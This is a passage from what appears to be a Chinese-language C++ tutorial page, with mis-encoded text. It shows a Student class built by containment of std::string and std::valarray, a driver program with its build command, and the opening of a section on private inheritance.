class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">    Student() : name(<span class="string">&quot;Null Student&quot;</span>), scores() &#123;&#125; <span class="comment">// é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ string å’Œ valarray åˆå§‹åŒ–</span></span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">const</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; &amp; a)</span><br><span class="line">        : name(s), scores(a) &#123;&#125;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ string å’Œ C é£æ ¼æ•°ç»„åˆå§‹åŒ–</span></span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">const</span> <span class="keyword">double</span> * pd, <span class="keyword">int</span> n)</span><br><span class="line">        : name(s), scores(pd, n) &#123;&#125; <span class="comment">// valarray æ„é€ å‡½æ•°æ¥å— (æŒ‡é’ˆ, æ•°é‡)</span></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å’Œ C é£æ ¼æ•°ç»„åˆå§‹åŒ–</span></span><br><span class="line">    Student(<span class="keyword">const</span> <span class="keyword">char</span> * str, <span class="keyword">const</span> <span class="keyword">double</span> * pd, <span class="keyword">int</span> n)</span><br><span class="line">        : name(str), scores(pd, n) &#123;&#125; <span class="comment">// string å’Œ valarray æ„é€ å‡½æ•°å¤„ç†è½¬æ¢</span></span><br><span class="line"></span><br><span class="line">    ~Student() &#123;&#125; <span class="comment">// ææ„å‡½æ•° (é»˜è®¤å³å¯ï¼Œå› ä¸º string å’Œ valarray ä¼šè‡ªå·±ç®¡ç†èµ„æº)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®å™¨</span></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">Average</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// è®¡ç®—å¹³å‡åˆ†</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// è·å–å§“å (è¿”å› const å¼•ç”¨é¿å…å¤åˆ¶)</span></span><br><span class="line">    <span class="keyword">double</span> <span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span>; <span class="comment">// è·å–ç¬¬ i é—¨è¯¾åˆ†æ•° (const ç‰ˆæœ¬)</span></span><br><span class="line">    <span class="keyword">double</span> &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i);     <span class="comment">// è·å–/è®¾ç½®ç¬¬ i é—¨è¯¾åˆ†æ•° (é const ç‰ˆæœ¬)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‹å…ƒå‡½æ•° - ç”¨äºè¾“å…¥è¾“å‡º</span></span><br><span class="line">    <span class="comment">// input</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::istream &amp; <span class="keyword">operator</span>&gt;&gt;(<span class="built_in">std</span>::istream &amp; is, Student &amp; stu); <span class="comment">// è¯»å–å§“å</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="built_in">std</span>::istream &amp; <span class="title">getline</span><span class="params">(<span class="built_in">std</span>::istream &amp; is, Student &amp; stu)</span></span>;   <span class="comment">// è¯»å–å§“å (æ•´è¡Œ)</span></span><br><span class="line">    <span class="comment">// output</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Student &amp; stu);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STUDENTC_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>å…³é”®ç‚¹:</strong></p><ul><li><strong>æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨:</strong> <code>Student</code> çš„æ„é€ å‡½æ•°ä½¿ç”¨<strong>æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨</strong>æ¥åˆå§‹åŒ– <code>name</code> å’Œ <code>scores</code> æˆå‘˜ã€‚<ul><li>  <code>name(s)</code>: è°ƒç”¨ <code>std::string</code> çš„æ„é€ å‡½æ•°ï¼ˆæˆ–å¤åˆ¶æ„é€ å‡½æ•°ï¼‰æ¥åˆå§‹åŒ– <code>name</code>ã€‚</li><li>  <code>scores(a)</code> æˆ– <code>scores(pd, n)</code>: è°ƒç”¨ <code>std::valarray&lt;double&gt;</code> çš„ç›¸åº”æ„é€ å‡½æ•°æ¥åˆå§‹åŒ– <code>scores</code>ã€‚</li></ul></li><li>  <strong>è‡ªåŠ¨èµ„æºç®¡ç†:</strong> å› ä¸º <code>std::string</code> å’Œ <code>std::valarray</code> éƒ½æ˜¯è®¾è®¡è‰¯å¥½çš„ç±»ï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨ç®¡ç†è‡ªå·±çš„å†…å­˜ï¼ˆ<code>string</code> ç®¡ç†å­—ç¬¦æ•°æ®ï¼Œ<code>valarray</code> ç®¡ç† <code>double</code> æ•°æ®ï¼‰ã€‚å› æ­¤ï¼Œ<code>Student</code> ç±»<strong>ä¸éœ€è¦</strong>æ˜¾å¼åœ°ç¼–å†™ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°æˆ–èµ‹å€¼è¿ç®—ç¬¦æ¥å¤„ç† <code>name</code> å’Œ <code>scores</code> çš„å†…å­˜ç®¡ç†ï¼ˆéµå¾ª<strong>é›¶æ³•åˆ™</strong>ï¼‰ã€‚ç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬ä¼šæ­£ç¡®åœ°è°ƒç”¨ <code>string</code> å’Œ <code>valarray</code> çš„ç›¸åº”ç‰¹æ®Šæˆå‘˜å‡½æ•°ã€‚</li><li>  <strong>æ¥å£è½¬å‘:</strong> <code>Student</code> ç±»çš„ä¸€äº›æ–¹æ³•ï¼ˆå¦‚ <code>operator[]</code>ï¼‰å°†æ“ä½œè½¬å‘ç»™å…¶æˆå‘˜å¯¹è±¡ï¼ˆ<code>scores[i]</code>ï¼‰ã€‚</li></ul><h3 id="14-1-3-Student-ç±»ç¤ºä¾‹"><a href="#14-1-3-Student-ç±»ç¤ºä¾‹" class="headerlink" title="14.1.3 Student ç±»ç¤ºä¾‹"></a>14.1.3 Student ç±»ç¤ºä¾‹</h3><p><strong>studentc.cpp (Student ç±»å®ç°)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;studentc.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::ostream;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::istream;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¬æœ‰æ–¹æ³•å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Student::Average</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (scores.size() &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> scores.sum() / scores.size(); <span class="comment">// ä½¿ç”¨ valarray çš„ sum() å’Œ size()</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="built_in">string</span> &amp; <span class="title">Student::Name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ [] è®¿é—®åˆ†æ•°</span></span><br><span class="line"><span class="keyword">double</span> Student::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> scores[i]; <span class="comment">// è°ƒç”¨ valarray çš„ operator[]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> &amp; Student::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">return</span> scores[i]; <span class="comment">// è°ƒç”¨ valarray çš„ operator[]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç§æœ‰æ–¹æ³•å®ç°</span></span><br><span class="line"><span class="comment">// è¾“å‡ºåˆ†æ•°æ•°ç»„</span></span><br><span class="line"><span class="function">ostream &amp; <span class="title">Student::arr_out</span><span class="params">(ostream &amp; os)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> lim = scores.size();</span><br><span class="line">    <span class="keyword">if</span> (lim &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; lim; i++) &#123;</span><br><span class="line">            os &lt;&lt; scores[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">4</span>) <span class="comment">// æ¯ 5 ä¸ªæ¢è¡Œ</span></span><br><span class="line">                os &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">5</span> != <span class="number">0</span>)</span><br><span class="line">            os &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        os &lt;&lt; <span class="string">&quot; empty array &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‹å…ƒå‡½æ•°å®ç°</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨ &gt;&gt; è¯»å–å§“å</span></span><br><span class="line">istream &amp; <span class="keyword">operator</span>&gt;&gt;(istream &amp; is, Student &amp; stu) &#123;</span><br><span class="line">    is &gt;&gt; stu.name; <span class="comment">// è°ƒç”¨ string çš„ operator&gt;&gt;</span></span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ getline è¯»å–å§“å (æ•´è¡Œ)</span></span><br><span class="line"><span class="function">istream &amp; <span class="title">getline</span><span class="params">(istream &amp; is, Student &amp; stu)</span> </span>&#123;</span><br><span class="line">    getline(is, stu.name); <span class="comment">// è°ƒç”¨ string çš„ getline</span></span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ &lt;&lt; è¾“å‡ºå­¦ç”Ÿä¿¡æ¯</span></span><br><span class="line">ostream &amp; <span class="keyword">operator</span>&lt;&lt;(ostream &amp; os, <span class="keyword">const</span> Student &amp; stu) &#123;</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Scores for &quot;</span> &lt;&lt; stu.name &lt;&lt; <span class="string">&quot;:\n&quot;</span>;</span><br><span class="line">    stu.arr_out(os); <span class="comment">// ä½¿ç”¨ç§æœ‰æ–¹æ³•è¾“å‡ºåˆ†æ•°</span></span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>use_stuc.cpp (ä½¿ç”¨ Student ç±»)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;studentc.h&quot;</span> <span class="comment">// åŒ…å« Student ç±»å®šä¹‰</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(Student &amp; sa, <span class="keyword">int</span> n)</span></span>; <span class="comment">// å‡½æ•°åŸå‹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> pupils = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> quizzes = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Student ada[pupils] = &#123; <span class="comment">// åˆ›å»º Student å¯¹è±¡æ•°ç»„</span></span><br><span class="line">        Student(quizzes), Student(quizzes), Student(quizzes) <span class="comment">// å‡è®¾æœ‰ Student(int n) æ„é€ å‡½æ•°</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‡è®¾ studentc.h/cpp å·²ä¿®æ”¹ï¼Œæ·»åŠ æ„é€ å‡½æ•° Student(int n)</span></span><br><span class="line">    <span class="comment">// Student::Student(int n) : name(&quot;Nully&quot;), scores(n) &#123;&#125; // ç¤ºä¾‹æ„é€ å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœæ²¡æœ‰ Student(int n)ï¼Œåˆ™éœ€è¦è¿™æ ·åˆ›å»ºï¼š</span></span><br><span class="line">    <span class="comment">// double sample_scores[quizzes] = &#123;0.0&#125;; // ç¤ºä¾‹åˆ†æ•°</span></span><br><span class="line">    <span class="comment">// Student ada[pupils] = &#123;</span></span><br><span class="line">    <span class="comment">//     Student(&quot;Default1&quot;, sample_scores, quizzes),</span></span><br><span class="line">    <span class="comment">//     Student(&quot;Default2&quot;, sample_scores, quizzes),</span></span><br><span class="line">    <span class="comment">//     Student(&quot;Default3&quot;, sample_scores, quizzes)</span></span><br><span class="line">    <span class="comment">// &#125;;</span></span><br><span class="line">    <span class="comment">// ä¸ºäº†ç¼–è¯‘é€šè¿‡ï¼Œæˆ‘ä»¬å‡è®¾ Student(int n) å­˜åœ¨</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i)</span><br><span class="line">        <span class="built_in">set</span>(ada[i], quizzes); <span class="comment">// è®¾ç½®å­¦ç”Ÿæ•°æ®</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nStudent List:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ada[i].Name() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºå§“å</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nResults:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; ada[i]; <span class="comment">// è¾“å‡ºå®Œæ•´ä¿¡æ¯ (è°ƒç”¨ operator&lt;&lt;)</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;average: &quot;</span> &lt;&lt; ada[i].Average() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºå¹³å‡åˆ†</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šè®¾ç½®å­¦ç”Ÿå§“åå’Œåˆ†æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(Student &amp; sa, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter the student&#x27;s name: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">cin</span>, sa); <span class="comment">// ä½¿ç”¨å‹å…ƒ getline è¯»å–å§“å</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; quiz scores:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; sa[i]; <span class="comment">// ä½¿ç”¨ operator[] è®¾ç½®åˆ†æ•°</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>.get() != <span class="string">&#x27;\n&#x27;</span>) <span class="comment">// æ¸…é™¤è¾“å…¥ç¼“å†²åŒº</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- éœ€è¦ä¿®æ”¹ studentc.h/cpp æ·»åŠ  Student(int n) æ„é€ å‡½æ•° ---</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// studentc.h æ·»åŠ :</span></span><br><span class="line"><span class="comment">    explicit Student(int n) : name(&quot;Nully&quot;), scores(n) &#123;&#125; // explicit é˜²æ­¢æ„å¤–è½¬æ¢</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// studentc.cpp ä¸éœ€è¦é¢å¤–æ·»åŠ ï¼Œå› ä¸ºåˆå§‹åŒ–åˆ—è¡¨å·²å®Œæˆå·¥ä½œ</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œè¿è¡Œ:</strong></p><p>ä½ éœ€è¦å°† <code>studentc.cpp</code> å’Œ <code>use_stuc.cpp</code> ä¸€èµ·ç¼–è¯‘é“¾æ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## å‡è®¾ studentc.h/cpp å·²æ·»åŠ  Student(int n) æ„é€ å‡½æ•°</span></span><br><span class="line">g++ use_stuc.cpp studentc.cpp -o use_stuc</span><br><span class="line">./use_stuc</span><br></pre></td></tr></table></figure><p>ç¨‹åºä¼šæç¤ºè¾“å…¥æ¯ä¸ªå­¦ç”Ÿçš„åå­—å’Œåˆ†æ•°ï¼Œç„¶åæ˜¾ç¤ºå­¦ç”Ÿåˆ—è¡¨å’Œæ¯ä¸ªå­¦ç”Ÿçš„è¯¦ç»†ä¿¡æ¯åŠå¹³å‡åˆ†ã€‚</p><p><strong>æ€»ç»“:</strong></p><ul><li>  <strong>åŒ…å« (ç»„åˆ)</strong> æ˜¯é€šè¿‡å°†ä¸€ä¸ªç±»çš„å¯¹è±¡ä½œä¸ºå¦ä¸€ä¸ªç±»çš„æˆå‘˜æ¥å®ç°çš„ï¼Œæ¨¡æ‹Ÿ <strong>â€œhas-aâ€</strong> å…³ç³»ã€‚</li><li>  è¿™æ˜¯ä»£ç é‡ç”¨çš„é‡è¦æ–¹å¼ï¼Œå…è®¸åˆ©ç”¨ç°æœ‰ç±»çš„åŠŸèƒ½ã€‚</li><li>  åŒ…å«ç±»çš„æ„é€ å‡½æ•°é€šå¸¸ä½¿ç”¨<strong>æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨</strong>æ¥è°ƒç”¨æˆå‘˜å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚</li><li>  å¦‚æœæˆå‘˜å¯¹è±¡èƒ½æ­£ç¡®ç®¡ç†è‡ªå·±çš„èµ„æºï¼ˆå¦‚ <code>std::string</code>, <code>std::valarray</code>, æ™ºèƒ½æŒ‡é’ˆï¼‰ï¼ŒåŒ…å«ç±»é€šå¸¸ä¸éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶/ç§»åŠ¨æ“ä½œï¼ˆ<strong>é›¶æ³•åˆ™</strong>ï¼‰ã€‚</li><li>  åŒ…å«ç±»å¯ä»¥é€šè¿‡å…¶æˆå‘˜å¯¹è±¡çš„å…¬æœ‰æ¥å£æ¥ä½¿ç”¨å®ƒä»¬çš„åŠŸèƒ½ã€‚</li></ul><h2 id="14-2-ç§æœ‰ç»§æ‰¿"><a href="#14-2-ç§æœ‰ç»§æ‰¿" class="headerlink" title="14.2 ç§æœ‰ç»§æ‰¿"></a>14.2 ç§æœ‰ç»§æ‰¿</h2><p>é™¤äº†å…¬æœ‰ç»§æ‰¿ (<code>public</code>) æ¨¡æ‹Ÿ â€œis-aâ€ å…³ç³»å¤–ï¼ŒC++ è¿˜æä¾›äº†<strong>ç§æœ‰ç»§æ‰¿ (<code>private</code>)**ã€‚ç§æœ‰ç»§æ‰¿æ¨¡æ‹Ÿçš„æ˜¯ **â€has-aâ€</strong> æˆ–æ›´å‡†ç¡®åœ°è¯´æ˜¯ <strong>â€œis-implemented-in-terms-ofâ€</strong> ï¼ˆæ ¹æ®â€¦æ¥å®ç°ï¼‰çš„å…³ç³»ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DerivedClassName</span> :</span> <span class="keyword">private</span> BaseClassName &#123;</span><br><span class="line">    <span class="comment">// ... æ´¾ç”Ÿç±»æˆå‘˜ ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><em>é»˜è®¤çš„ç»§æ‰¿æ–¹å¼ï¼ˆå¦‚æœçœç•¥è®¿é—®è¯´æ˜ç¬¦ï¼‰ä¹Ÿæ˜¯ <code>private</code> (å¯¹äº <code>class</code>)ã€‚</em></p><p><strong>è®¿é—®è§„åˆ™:</strong></p><p>å½“ä¸€ä¸ªç±»ç§æœ‰ç»§æ‰¿è‡ªåŸºç±»æ—¶ï¼š</p><ul><li>  åŸºç±»çš„ <code>public</code> æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸º **<code>private</code>**ã€‚</li><li>  åŸºç±»çš„ <code>protected</code> æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸º **<code>private</code>**ã€‚</li><li>  åŸºç±»çš„ <code>private</code> æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯<strong>ä¸å¯ç›´æ¥è®¿é—®</strong>çš„ã€‚</li></ul><p><strong>æ ¸å¿ƒæ€æƒ³:</strong></p><p>ç§æœ‰ç»§æ‰¿æ„å‘³ç€æ´¾ç”Ÿç±»<strong>ç»§æ‰¿äº†åŸºç±»çš„å®ç°</strong>ï¼Œä½†<strong>ä¸ç»§æ‰¿å…¶æ¥å£</strong>ã€‚åŸºç±»çš„å…¬æœ‰æ–¹æ³•ä¸ä¼šæˆä¸ºæ´¾ç”Ÿç±»å¯¹è±¡çš„å…¬æœ‰æ¥å£çš„ä¸€éƒ¨åˆ†ã€‚å¤–éƒ¨ä»£ç ä¸èƒ½é€šè¿‡æ´¾ç”Ÿç±»å¯¹è±¡ç›´æ¥è°ƒç”¨åŸºç±»çš„å…¬æœ‰æ–¹æ³•ã€‚æ´¾ç”Ÿç±»å†…éƒ¨çš„æˆå‘˜å‡½æ•°ï¼ˆä»¥åŠå‹å…ƒï¼‰ä»ç„¶å¯ä»¥è®¿é—®åŸºç±»çš„ <code>public</code> å’Œ <code>protected</code> æˆå‘˜ï¼ˆå› ä¸ºå®ƒä»¬åœ¨æ´¾ç”Ÿç±»å†…éƒ¨æ˜¯ <code>private</code> çš„ï¼‰ã€‚</p><p><strong>ä¸å…¬æœ‰ç»§æ‰¿çš„åŒºåˆ«:</strong></p><ul><li>  <strong>å…³ç³»:</strong> å…¬æœ‰ç»§æ‰¿æ˜¯ â€œis-aâ€ï¼Œç§æœ‰ç»§æ‰¿æ˜¯ â€œis-implemented-in-terms-ofâ€ã€‚</li><li>  <strong>æ¥å£:</strong> å…¬æœ‰ç»§æ‰¿ç»§æ‰¿æ¥å£å’Œå®ç°ï¼›ç§æœ‰ç»§æ‰¿åªç»§æ‰¿å®ç°ã€‚</li><li>  <strong>æŒ‡é’ˆ/å¼•ç”¨è½¬æ¢:</strong> å…¬æœ‰ç»§æ‰¿ä¸‹ï¼ŒåŸºç±»æŒ‡é’ˆ/å¼•ç”¨å¯ä»¥æŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡ï¼›ç§æœ‰ç»§æ‰¿ä¸‹ï¼Œè¿™ç§éšå¼è½¬æ¢<strong>ä¸å…è®¸</strong>ï¼ˆé™¤éåœ¨æ´¾ç”Ÿç±»å†…éƒ¨æˆ–å…¶å‹å…ƒä¸­ï¼‰ã€‚</li></ul><h3 id="14-2-1-Student-ç±»ç¤ºä¾‹ï¼ˆæ–°ç‰ˆæœ¬ï¼‰"><a href="#14-2-1-Student-ç±»ç¤ºä¾‹ï¼ˆæ–°ç‰ˆæœ¬ï¼‰" class="headerlink" title="14.2.1 Student ç±»ç¤ºä¾‹ï¼ˆæ–°ç‰ˆæœ¬ï¼‰"></a>14.2.1 Student ç±»ç¤ºä¾‹ï¼ˆæ–°ç‰ˆæœ¬ï¼‰</h3><p>è®©æˆ‘ä»¬é‡æ–°å®ç° <code>Student</code> ç±»ï¼Œè¿™æ¬¡ä½¿ç”¨ç§æœ‰ç»§æ‰¿è€Œä¸æ˜¯åŒ…å«ï¼ˆç»„åˆï¼‰ã€‚<code>Student</code> ç±»å°†ç§æœ‰ç»§æ‰¿è‡ª <code>std::string</code>ï¼ˆç”¨äºå§“åï¼‰å’Œ <code>std::valarray&lt;double&gt;</code>ï¼ˆç”¨äºåˆ†æ•°ï¼‰ã€‚</p><p><strong>studenti.h (ç§æœ‰ç»§æ‰¿ç‰ˆæœ¬)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 